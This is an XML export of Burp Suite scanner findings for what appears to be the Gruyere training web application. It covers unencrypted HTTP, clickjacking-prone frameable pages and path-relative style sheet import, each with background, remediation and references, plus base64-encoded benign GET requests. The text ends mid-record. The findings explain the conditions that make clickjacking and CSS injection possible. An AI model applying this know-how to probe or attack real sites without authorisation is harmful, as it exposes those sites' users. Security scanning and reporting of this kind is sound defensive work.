<?xml version="1.0"?>
<!DOCTYPE issues [
<!ELEMENT issues (issue*)>
<!ATTLIST issues burpVersion CDATA "">
<!ATTLIST issues exportTime CDATA "">
<!ELEMENT issue (serialNumber, type, name, host, path, location, severity, confidence, issueBackground?, remediationBackground?, references?, vulnerabilityClassifications?, issueDetail?, issueDetailItems?, remediationDetail?, requestresponse*, collaboratorEvent*, infiltratorEvent*)>
<!ELEMENT serialNumber (#PCDATA)>
<!ELEMENT type (#PCDATA)>
<!ELEMENT name (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT path (#PCDATA)>
<!ELEMENT location (#PCDATA)>
<!ELEMENT severity (#PCDATA)>
<!ELEMENT confidence (#PCDATA)>
<!ELEMENT issueBackground (#PCDATA)>
<!ELEMENT remediationBackground (#PCDATA)>
<!ELEMENT references (#PCDATA)>
<!ELEMENT vulnerabilityClassifications (#PCDATA)>
<!ELEMENT issueDetail (#PCDATA)>
<!ELEMENT issueDetailItems (issueDetailItem*)>
<!ELEMENT issueDetailItem (#PCDATA)>
<!ELEMENT remediationDetail (#PCDATA)>
<!ELEMENT requestresponse (request?, response?, responseRedirected?)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request method CDATA "">
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT responseRedirected (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT message (#PCDATA)>
<!ELEMENT conversation (#PCDATA)>
<!ELEMENT recipient (#PCDATA)>
<!ELEMENT recipients (recipient*)>
<!ELEMENT smtp (sender, recipients, message, conversation)>
<!ELEMENT collaboratorEvent (interactionType, originIp, time, lookupType?, lookupHost?, requestresponse?, smtp?)>
<!ELEMENT interactionType (#PCDATA)>
<!ELEMENT originIp (#PCDATA)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT lookupType (#PCDATA)>
<!ELEMENT lookupHost (#PCDATA)>
<!ELEMENT infiltratorEvent (parameterName, platform, signature, stackTrace?, parameterValue?, collaboratorEvent)>
<!ELEMENT parameterName (#PCDATA)>
<!ELEMENT platform (#PCDATA)>
<!ELEMENT signature (#PCDATA)>
<!ELEMENT stackTrace (#PCDATA)>
<!ELEMENT parameterValue (#PCDATA)>
]>
<issues burpVersion="1.7.30" exportTime="Thu Jan 18 09:45:36 UTC 2018">
  <issue>
    <serialNumber>4676559244812925952</serialNumber>
    <type>16777728</type>
    <name><![CDATA[Unencrypted communications]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Low</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The application allows users to connect to it over unencrypted connections.  An attacker suitably positioned to view a legitimate user's network traffic could record and monitor their interactions with the application and obtain any information the user supplies. Furthermore, an attacker able to modify traffic could use the application as a platform for attacks against its users and third-party websites. Unencrypted connections have been exploited by ISPs and governments to track users, and to inject adverts and malicious JavaScript. Due to these concerns, web browser vendors are planning to visually flag unencrypted connections as hazardous.</p>
<p>
To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.
</p>
<p>Please note that using a mixture of encrypted and unencrypted communications is an ineffective defense against active attackers, because they can easily remove references to encrypted resources when these references are transmitted over an unencrypted connection.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Applications should use transport-level encryption (SSL/TLS) to protect all communications passing between the client and the server. The Strict-Transport-Security HTTP header should be used to ensure that clients refuse to access the server over an insecure connection.</p>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://www.chromium.org/Home/chromium-security/marking-http-as-non-secure">Marking HTTP as non-secure</a></li>
<li><a href="https://wiki.mozilla.org/Security/Server_Side_TLS">Configuring Server-Side SSL/TLS</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security">HTTP Strict Transport Security</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326: Inadequate Encryption Strength</a></li>
</ul>]]></vulnerabilityClassifications>
  </issue>
  <issue>
    <serialNumber>86388820394418176</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2153333944038170624</serialNumber>
    <type>2097960</type>
    <name><![CDATA[Path-relative style sheet import]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: no sniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blog.portswigger.net/2015/02/prssi.html">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1947243131818020864</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/0]]></path>
    <location><![CDATA[/0]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8wIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNjljMGE5MjBlNGFkYTQ0ZDU3NTdmYzAzYjI1MjU5NDINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDo1MCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3762505049445112832</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/0/]]></path>
    <location><![CDATA[/0/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8wLyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogOTAxOTQxZTFlYjcxZGVhNDE3ODIxNDhjYjYxZDkwOTMNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMToxNSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>75989711579827712</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/1]]></path>
    <location><![CDATA[/1]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8xIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogODdlOWVkZjI3NDczYzFmOWYzZmE1MzJlNjllYWNmN2QNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMToxNyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2758141665356152832</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/1/]]></path>
    <location><![CDATA[/1/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8xLyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNjE1MGI4ZWYyM2RhYmM5YzhmYmNmMTZlMzIzMzc5NGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMTozNCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8666877335480922112</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/2]]></path>
    <location><![CDATA[/2]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
